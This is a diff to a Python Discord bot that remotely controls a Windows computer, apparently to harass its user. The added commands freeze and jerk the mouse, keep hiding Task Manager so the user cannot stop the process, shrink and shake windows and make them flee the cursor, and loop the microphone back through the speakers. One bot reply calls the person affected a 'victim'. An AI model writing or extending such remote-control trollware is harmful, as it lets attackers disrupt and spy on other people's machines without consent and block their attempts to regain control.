@@ -33,14 +33,21 @@ from tkinter import ttk
 from dotenv import load_dotenv
 from pynput import mouse
 
-dota_already_detected = False
-
 pygame.mixer.init()
 os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
 
 load_dotenv()
 
 TOKEN = os.getenv('BOT_TOKEN')
+
+window_runner_active = False
+
+echo_active = False
+
+dota_already_detected = False
+
+fake_lag_active = False
+lag_intensity = 0.1
 
 start_time = time.time()
 
@@ -256,6 +263,167 @@ async def check_game():
             window_process.terminate()
             print(f"{TARGET_PROCESS} закрыт. Закрываю окно.")
 
+def fake_lag_logic():
+    import ctypes
+    import time
+    
+    # Подгружаем функцию перемещения для скорости
+    set_pos = ctypes.windll.user32.SetCursorPos
+    get_pos = ctypes.windll.user32.GetCursorPos
+    
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+    while fake_lag_active:
+        # 1. Фиксируем точку "заморозки"
+        pt = POINT()
+        get_pos(ctypes.byref(pt))
+        freeze_x, freeze_y = pt.x, pt.y
+        
+        start_time = time.perf_counter()
+        
+        while time.perf_counter() - start_time < lag_intensity:
+            if not fake_lag_active: break
+            set_pos(freeze_x, freeze_y)
+            # Микро-пауза, чтобы не забить процессор на 100%
+            time.sleep(0.001) 
+        
+        time.sleep(0.01)
+
+@bot.slash_command(name='fake_lag', description='Создать эффект диких лагов мышки', guild_ids=[711194167757242368])
+async def fake_lag_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global fake_lag_active
+    
+    if action == "Включить":
+        if fake_lag_active:
+            return await ctx.respond("⏳ Лаги уже активированы!", ephemeral=True)
+        fake_lag_active = True
+        threading.Thread(target=fake_lag_logic, daemon=True).start()
+        await ctx.respond("📉 **Система «лагает»!** Теперь мышка движется рывками, как на древнем железе.")
+    else:
+        fake_lag_active = False
+        await ctx.respond("🚀 **Лаги устранены.** Система снова работает плавно.")
+
+def anti_manager_logic():
+    import win32gui, win32con
+    while anti_manager_active:
+        for title in ["Диспетчер задач", "Task Manager"]:
+            hwnd = win32gui.FindWindow(None, title)
+            if hwnd:
+                # SW_MINIMIZE (6) — свернуть окно
+                # SW_HIDE (0) — полностью скрыть (окно останется в процессах, но исчезнет с экрана)
+                win32gui.ShowWindow(hwnd, win32con.SW_HIDE) 
+        time.sleep(0.3) # Очень быстрая проверка
+
+@bot.slash_command(name='anti_manager', description='Запретить открывать Диспетчер задач', guild_ids=[711194167757242368])
+async def anti_manager_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global anti_manager_active
+    if action == "Включить":
+        anti_manager_active = True
+        threading.Thread(target=anti_manager_logic, daemon=True).start()
+        await ctx.respond("🛡️ **Защита активирована.** Диспетчер задач теперь под запретом.")
+    else:
+        anti_manager_active = False
+        await ctx.respond("✅ Доступ к системе восстановлен.")
+
+
+@bot.slash_command(name='window_shrink', description='Сжать активное окно до размера 50x50', guild_ids=[711194167757242368])
+async def window_shrink_slash(ctx: discord.ApplicationContext):
+    import win32gui, win32con
+    
+    hwnd = win32gui.GetForegroundWindow()
+    if not hwnd:
+        return await ctx.respond("❌ Не найдено активное окно.", ephemeral=True)
+    
+    # 1. Сначала восстанавливаем окно, если оно развернуто
+    tup = win32gui.GetWindowPlacement(hwnd)
+    if tup[1] == win32con.SW_SHOWMAXIMIZED:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        time.sleep(0.1)
+    
+    # 2. Получаем координаты, чтобы окно не прыгало при уменьшении
+    rect = win32gui.GetWindowRect(hwnd)
+    x, y = rect[0], rect[1]
+    
+    # 3. Сжимаем до 50x50
+    # True в конце заставляет окно перерисоваться
+    win32gui.MoveWindow(hwnd, x, y, 50, 50, True)
+    
+    await ctx.respond("🔎 **Окно превращено в нано-объект!**")
+
+def runner_logic():
+    import win32gui, win32api, win32con, random
+    
+    # Размеры экрана
+    sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
+    sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
+
+    while window_runner_active:
+        hwnd = win32gui.GetForegroundWindow()
+        if hwnd:
+            if win32gui.GetClassName(hwnd) not in ["Progman", "Shell_TrayWnd"]:
+                # 1. Снимаем полноэкранный режим, если он есть
+                tup = win32gui.GetWindowPlacement(hwnd)
+                if tup[1] == win32con.SW_SHOWMAXIMIZED:
+                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+                    time.sleep(0.1)
+
+                # 2. Получаем текущие размеры
+                rect = win32gui.GetWindowRect(hwnd)
+                w = rect[2] - rect[0]
+                h = rect[3] - rect[1]
+                
+                # 3. КРИТИЧЕСКИЙ ФИКС: Если окно слишком большое, уменьшаем его!
+                if w > 100 or h > 100:
+                    w = 100
+                    h = 100
+                    # Сразу применяем новый размер, чтобы расчеты ниже были верными
+                    win32gui.MoveWindow(hwnd, rect[0], rect[1], w, h, True)
+
+                # 4. Проверяем положение мыши
+                mx, my = win32api.GetCursorPos()
+                wx, wy = (rect[0] + w // 2), (rect[1] + h // 2)
+                
+                if abs(mx - wx) < 150 and abs(my - wy) < 150:
+                    # Прыгаем в любое место, где окно влезет целиком
+                    new_x = random.randint(0, max(0, sw - w))
+                    new_y = random.randint(0, max(0, sh - h))
+                    win32gui.MoveWindow(hwnd, new_x, new_y, w, h, True)
+                    
+        time.sleep(0.1)
+
+@bot.slash_command(name='window_runner', description='Окна начинают убегать от мышки', guild_ids=[711194167757242368])
+async def window_runner_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global window_runner_active
+    if action == "Включить":
+        window_runner_active = True
+        threading.Thread(target=runner_logic, daemon=True).start()
+        await ctx.respond("🏃 **Окна вышли на пробежку!** Попробуй поймай.")
+    else:
+        window_runner_active = False
+        await ctx.respond("🛑 Окна устали и остановились.")
+
+def echo_logic():
+    import sounddevice as sd
+    fs = 44100
+    duration = 1.5
+    while echo_active:
+        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
+        sd.wait()
+        if echo_active:
+            sd.play(rec, fs)
+            sd.wait()
+
+@bot.slash_command(name='echo_voice', description='Зацикленное эхо из микрофона в колонки', guild_ids=[711194167757242368])
+async def echo_voice_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global echo_active
+    if action == "Включить":
+        echo_active = True
+        threading.Thread(target=echo_logic, daemon=True).start()
+        await ctx.respond("🎙️ **Эхо-паранойя запущена.** Теперь жертва будет спотыкаться о свои же слова.")
+    else:
+        echo_active = False
+        await ctx.respond("🔇 Тишина восстановлена.")
 
 def slow_mouse_logic():
     import ctypes
@@ -478,19 +646,25 @@ async def folder_bomb_slash(ctx: discord.ApplicationContext):
 
 
 def shake_window():
+    import win32gui, win32con, random
     hwnd = win32gui.GetForegroundWindow()
     if not hwnd: return
     
+    # Если окно на весь экран — восстанавливаем его
+    tup = win32gui.GetWindowPlacement(hwnd)
+    if tup[1] == win32con.SW_SHOWMAXIMIZED:
+        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
+        time.sleep(0.1)
+
     rect = win32gui.GetWindowRect(hwnd)
     x, y, w, h = rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1]
     
-    for _ in range(30): # Трясем 3 секунды (30 итераций по 0.1 сек)
+    for _ in range(30):
         offset_x = random.randint(-15, 15)
         offset_y = random.randint(-15, 15)
         win32gui.MoveWindow(hwnd, x + offset_x, y + offset_y, w, h, True)
         time.sleep(0.05)
     
-    # Возвращаем на место
     win32gui.MoveWindow(hwnd, x, y, w, h, True)
 
 @bot.slash_command(name='earthquake', description='Потрясти активное окно 3 секунды', guild_ids=[711194167757242368])
